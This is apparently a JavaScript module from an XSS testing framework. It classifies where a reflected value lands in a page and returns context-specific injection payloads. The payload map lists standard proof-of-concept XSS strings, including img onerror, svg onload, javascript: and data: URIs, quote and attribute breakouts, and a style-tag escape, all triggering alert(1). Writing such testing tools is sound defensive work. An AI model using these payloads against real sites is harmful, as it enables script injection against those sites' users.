/**
 * @file context-analyzer.js
 * @description Context-aware XSS testing (HTML, JS, CSS, Attribute, URL)
 * @version 8.0.0
 */

(function() {
    'use strict';

    class ContextAnalyzer {
        constructor(framework) {
            this.framework = framework;
            this.contexts = new Map();
        }

        // ═══════════════════════════════════════════════════════════════
        // 🔍 Detect Context
        // ═══════════════════════════════════════════════════════════════
        detectContext(element, value) {
            const contexts = [];

            // HTML Context
            if (this.isHTMLContext(element)) {
                contexts.push({ type: 'html', severity: 'high' });
            }

            // JavaScript Context
            if (this.isJavaScriptContext(element, value)) {
                contexts.push({ type: 'javascript', severity: 'critical' });
            }

            // Attribute Context
            if (this.isAttributeContext(element, value)) {
                contexts.push({ type: 'attribute', severity: 'medium' });
            }

            // CSS Context
            if (this.isCSSContext(element)) {
                contexts.push({ type: 'css', severity: 'medium' });
            }

            // URL Context
            if (this.isURLContext(element, value)) {
                contexts.push({ type: 'url', severity: 'high' });
            }

            return contexts;
        }

        isHTMLContext(element) {
            return element.tagName !== 'SCRIPT' && 
                   element.tagName !== 'STYLE' &&
                   !element.hasAttribute('href') &&
                   !element.hasAttribute('src');
        }

        isJavaScriptContext(element, value) {
            if (element.tagName === 'SCRIPT') return true;
            
            const parent = element.parentElement;
            if (parent && parent.tagName === 'SCRIPT') return true;
            
            // Check if inside event handler
            for (const attr of element.attributes) {
                if (attr.name.startsWith('on') && attr.value.includes(value)) {
                    return true;
                }
            }
            
            return false;
        }

        isAttributeContext(element, value) {
            for (const attr of element.attributes) {
                if (attr.value === value || attr.value.includes(value)) {
                    return !attr.name.startsWith('on');
                }
            }
            return false;
        }

        isCSSContext(element) {
            return element.tagName === 'STYLE' || 
                   element.hasAttribute('style');
        }

        isURLContext(element, value) {
            const urlAttrs = ['href', 'src', 'action', 'formaction', 'data'];
            return urlAttrs.some(attr => {
                const attrValue = element.getAttribute(attr);
                return attrValue && (attrValue === value || attrValue.includes(value));
            });
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Get Context-Specific Payloads
        // ═══════════════════════════════════════════════════════════════
        getPayloadsForContext(contexts) {
            const payloads = [];

            contexts.forEach(context => {
                const contextPayloads = this.getContextPayloads(context.type);
                payloads.push(...contextPayloads);
            });

            return payloads;
        }

        getContextPayloads(contextType) {
            const payloadMap = {
                html: [
                    '<img src=x onerror=alert(1)>',
                    '<svg/onload=alert(1)>',
                    '<iframe src=javascript:alert(1)>'
                ],
                javascript: [
                    '\'-alert(1)-\'',
                    '\";alert(1);//',
                    '`-alert(1)-`'
                ],
                attribute: [
                    '" onload="alert(1)',
                    '\' onload=\'alert(1)',
                    'x" onerror="alert(1)'
                ],
                css: [
                    '</style><script>alert(1)</script>',
                    'expression(alert(1))',
                    'url(javascript:alert(1))'
                ],
                url: [
                    'javascript:alert(1)',
                    'data:text/html,<script>alert(1)</script>',
                    'vbscript:msgbox(1)'
                ]
            };

            return payloadMap[contextType] || [];
        }
    }

    // Export
    exports.ContextAnalyzer = ContextAnalyzer;
    exports.create = (framework) => new ContextAnalyzer(framework);
})();